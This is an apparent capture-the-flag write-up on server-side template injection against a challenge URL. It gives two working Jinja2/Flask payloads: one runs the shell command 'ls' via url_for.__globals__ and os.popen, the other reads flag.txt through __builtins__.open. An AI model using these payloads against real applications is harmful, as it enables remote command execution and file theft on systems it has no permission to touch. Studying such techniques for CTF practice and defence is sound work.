Server-Side Template Injection (SSTI)asda

Idea: given URL 'http://165.232.101.11:30440/notfoundquery{{ INJECT PYTHON STUFF }}'

1. Execute command to list local files 
```python
{{url_for.__globals__.os.__dict__.popen('ls').read()}}
```
-> then you will see 'flag.txt' file 
2.Execute command to read file
```python
{{url_for.__globals__.__builtins__.open('flag.txt').read()}}
```

